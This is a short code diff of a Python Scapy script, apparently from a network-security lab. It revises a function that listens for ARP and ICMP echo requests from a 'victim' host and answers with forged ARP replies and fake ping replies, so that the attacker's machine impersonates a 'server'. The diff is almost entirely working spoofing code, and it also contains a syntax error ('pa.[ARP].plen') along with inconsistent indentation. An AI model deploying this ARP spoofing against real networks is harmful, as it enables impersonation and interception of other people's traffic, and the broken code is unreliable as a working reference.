@@ -21,20 +21,20 @@ else:
 	print("ohoh :/ ")
 
 
-def test(anwser2):
-	if answer2.haslayer(ARP) is True:
-		if answer2[ARP].hwsrc == victimMAC and answer2[ARP].hwdst == myMAC and anwser2[ARP].psrc == victim and answer2[ARP].pdst == server and answer2[ARP].op == 1:
+def test(pa):
+	if pa.haslayer(ARP) is True:
+		if pa[ARP].psrc == victim and pa[ARP].pdst == server and pa[ARP].op == 1:
 			print(".", flush=True)
- 		packet4 = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=6, plen=4, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
- 		answer4 = srp1(packet4, timeout=1, verbose=False)
+ 		pr = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa.[ARP].plen, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
+ 		send(pr, verbose=False)
 
 
 
-	if answer2.haslayer(ICMP) is True:
-		if answer2[IP].src == victim and answer2[IP].dst == server and answer2[IP].type == 8:
+	if pa.haslayer(ICMP) is True:
+		if pa[IP].src == victim and pa[IP].dst == server and pa[IP].type == 8:
 			print("I.", flush=True)
-			packet3 = Ether(src=myMAC, dst=victimMAC)/IP(src=server, dst=victim)/ICMP(type=0)/"data"
-			send(packet3, verbose=False)
+			pr = Ether(src=myMAC, dst=victimMAC)/IP(src=server, dst=victim)/ICMP(type=0)/"data"
+			send(pr, verbose=False)
 
 
 print("[*] Usurpation:...")
